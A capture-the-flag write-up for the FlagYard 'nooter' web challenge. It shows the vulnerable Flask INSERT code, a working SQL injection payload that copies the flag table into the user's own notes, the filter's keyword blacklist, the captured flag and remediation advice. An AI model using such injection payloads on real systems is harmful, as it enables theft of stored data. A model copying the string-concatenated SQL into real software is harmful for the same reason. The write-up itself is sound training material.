FlagYard | nooter (Web — Easy) — Writeup

**Fares Badaj**

---

## Info

| | |
|---|---|
| Challenge | nooter |
| Difficulty | Easy |
| Category | Web |
| Platform | FlagYard Training Labs (SAFCSP) |
| Description | *Just another note taking app :)* |
| Flag | `FlagY{d695ef54fc9bd8ca664193eb485c4721}` |

---

## 1. Recon

Flask + SQLite note-taking app (register / login). Once logged in, the home
page accepts a `note` field and — crucially — **always re-renders the user's
notes** after saving:

```python
if 'loggedin' in session:
    ...
    if request.method == 'POST' and 'note' in request.form:
        note = request.form['note']
        if blacklist(note):
            msg = 'Forbidden word detected'
        else:
            query = db.insert(
                "INSERT INTO notes(username, notes) VALUES(?,'%s')" % note,
                session['username'])
    notes = db.select("SELECT notes FROM notes WHERE username = ?",
                      session['username'])
    return render_template('home.html', ... notes=notes ...)
```

The flag sits in a separate `flag` table (`INSERT INTO flag(flag) VALUES (?)`)
which is never shown on any page.

## 2. Injection point

`app.py:94` concatenates the note directly into the SQL — the username is the
only parameterized value:

```sql
INSERT INTO notes(username, notes) VALUES('me','{NOTE}')
```

Unlike the sibling "feedback" challenge, the output here is *visible*: notes
are SELECTed and rendered on the home page. So no blind extraction is needed —
one injection that materialises the flag as our own note is enough.

## 3. One-shot payload

Close the string slot and append a **second VALUES row** for our own account
populated with the flag:

```
note = "x'), ('u', (SELECT flag FROM flag)) -- "
```

```sql
INSERT INTO notes(username, notes)
VALUES('u','x'),
       ('u', (SELECT flag FROM flag)) -- ')
```

The trailing `-- ` comments out the app's closing `'`, the INSERT commits,
and the reload does `SELECT notes FROM notes WHERE username='u'`, which now
returns the flag string — re-rendered straight into the HTML.

## 4. Blacklist bypass

The filter blocks `exec, load, blob, glob, union, join, like, match, regexp,
in, limit, order, hex, where` — not needed here at all; the payload only uses
`select`, `flag` and value-multi-row syntax.

---

## Root cause

* String-formatted concatenation of user input into an INSERT
  (`VALUES(?,'%s')`) — only one binding is parameterized.
* Notes are re-queried and rendered after save, turning a blind SQLi point
  into a direct, visible write-the-flag-to-your-own-list primitive.

## Remediation

* Parameterize every value (`VALUES(?,?)`).
* Never concatenate user input into SQL; use the binding API exclusively.

## Files

* `solve_nooter.py` — automated exploit.
* `flag_from_nooter.txt` — `FlagY{d695ef54fc9bd8ca664193eb485c4721}`.